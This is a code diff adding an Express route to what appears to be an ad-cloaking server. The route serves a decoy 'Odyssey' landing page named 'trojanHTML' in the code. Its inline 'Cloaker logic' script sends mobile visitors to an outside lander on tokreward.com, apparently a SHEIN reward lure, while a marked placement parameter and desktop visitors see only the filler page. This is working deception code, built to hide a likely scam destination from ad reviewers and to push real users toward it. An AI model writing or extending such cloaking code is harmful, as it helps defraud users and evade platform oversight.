@@ -1810,6 +1810,148 @@ app.get('/ary/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
+app.get('/ary2/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=ARY`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Roboto', sans-serif;
+        background-color: #121212;
+        color: #e0e0e0;
+    }
+    .parallax-container {
+        height: 100vh;
+        overflow-x: hidden;
+        overflow-y: auto;
+        perspective: 1px;
+    }
+    .parallax-layer {
+        position: absolute;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+    }
+    .parallax-background {
+        transform: translateZ(-1px) scale(2);
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="%23303030"/></svg>') 0 0 repeat;
+        background-size: 50px 50px;
+        height: 100%;
+    }
+    .content {
+        transform: translateZ(0);
+        position: relative;
+        background-color: rgba(18, 18, 18, 0.8);
+        padding: 2rem;
+    }
+    header {
+        text-align: center;
+        padding: 4rem 0;
+    }
+    h1 {
+        font-size: 4rem;
+        color: #bb86fc;
+        margin-bottom: 0.5rem;
+    }
+    .tagline {
+        font-size: 1.5rem;
+        color: #03dac6;
+    }
+    .features {
+        display: flex;
+        justify-content: space-around;
+        flex-wrap: wrap;
+        margin: 4rem 0;
+    }
+    .feature {
+        background-color: #1f1f1f;
+        border-radius: 8px;
+        padding: 2rem;
+        margin: 1rem;
+        width: 300px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .feature:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+    .feature h2 {
+        color: #cf6679;
+        margin-top: 0;
+    }
+    footer {
+        text-align: center;
+        padding: 2rem 0;
+        background-color: #1f1f1f;
+    }
+    a {
+        color: #03dac6;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="parallax-container">
+        <div class="parallax-layer parallax-background"></div>
+        <div class="parallax-layer content">
+            <header>
+                <h1>${slug} Odyssey</h1>
+                <p class="tagline">Embark on a journey through ${slug}</p>
+            </header>
+            
+            <div class="features">
+                <div class="feature">
+                    <h2>Explore ${slug}</h2>
+                    <p>Dive into uncharted territories of ${slug} and discover its hidden wonders.</p>
+                </div>
+                <div class="feature">
+                    <h2>${slug} Mastery</h2>
+                    <p>Hone your skills and become a true master of ${slug} techniques.</p>
+                </div>
+                <div class="feature">
+                    <h2>${slug} Fusion</h2>
+                    <p>Experience the synergy of ${slug} with cutting-edge technologies.</p>
+                </div>
+            </div>
+            
+            <footer>
+                <p>&copy; 2024 ${slug} Odyssey | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </div>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served ARY Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/870/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=870`;
